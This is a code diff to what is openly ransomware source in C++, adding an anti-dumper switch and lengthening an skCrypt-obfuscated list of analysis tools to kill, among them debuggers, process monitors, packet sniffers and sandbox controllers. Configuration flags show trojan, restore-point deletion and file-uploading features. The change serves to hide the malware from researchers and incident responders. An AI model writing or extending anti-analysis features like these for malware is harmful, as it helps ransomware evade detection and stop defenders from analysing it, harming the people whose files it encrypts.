@@ -8,6 +8,7 @@
 #include <cryptopp/modes.h>
 #include <cryptopp/base64.h>
 
+#define _SILENCE_EXPERIMENTAL_FILESYSTEM_DEPRECATION_WARNING
 #define _CRT_SECURE_NO_WARNINGS
 #pragma warning(disable:4996)
 
@@ -47,6 +48,7 @@
 #define TROJAN				false	// enable or disable trojan (run real program in parallel with the ransomware)
 #define DROPRUN_TROJAN_FILE	false	// enable or disable droppper & runner of the real program in trojan mode
 #define TSK_REMOVER			false	// enable or disable remover of the taskmanagers
+#define ANTI_DUMPER			true	// enable or disable anti dumper
 #define DELETE_RESTOREPOINT false	// enable or disable restore points deleter
 #define CHANGE_FILE_ICON	false	// enable or disable custom icon for crypted files
 #define FILE_UPLOADER		false	// enable or disable file uploader
@@ -111,7 +113,33 @@ const std::string badPrograms[] = {
 	(std::string)skCrypt("ProcessHacker"),
 	(std::string)skCrypt("dumpcap"),
 	(std::string)skCrypt("Wireshark"),
-	(std::string)skCrypt("decompile")
+	(std::string)skCrypt("decompile"),
+	(std::string)skCrypt("ollydbg"),
+	(std::string)skCrypt("tcpview"),
+	(std::string)skCrypt("autoruns"),
+	(std::string)skCrypt("autorunsc"),
+	(std::string)skCrypt("filemon"),
+	(std::string)skCrypt("procmon"),
+	(std::string)skCrypt("regmon"),
+	(std::string)skCrypt("idaq"),
+	(std::string)skCrypt("idaq64"),
+	(std::string)skCrypt("ImmunityDebugger"),
+	(std::string)skCrypt("HookExplorer"),
+	(std::string)skCrypt("ImportREC"),
+	(std::string)skCrypt("PETools"),
+	(std::string)skCrypt("LordPE"),
+	(std::string)skCrypt("SysInspector"),
+	(std::string)skCrypt("proc_analyzer"),
+	(std::string)skCrypt("sysAnalyzer"),
+	(std::string)skCrypt("sniff_hit"),
+	(std::string)skCrypt("windbg"),
+	(std::string)skCrypt("joeboxcontrol"),
+	(std::string)skCrypt("joeboxserver"),
+	(std::string)skCrypt("ResourceHacker"),
+	(std::string)skCrypt("x32dbg"),
+	(std::string)skCrypt("x64dbg"),
+	(std::string)skCrypt("Fiddler"),
+	(std::string)skCrypt("httpdebugger")
 }; // tasks to kill
 
 const std::string blacklist[] = {
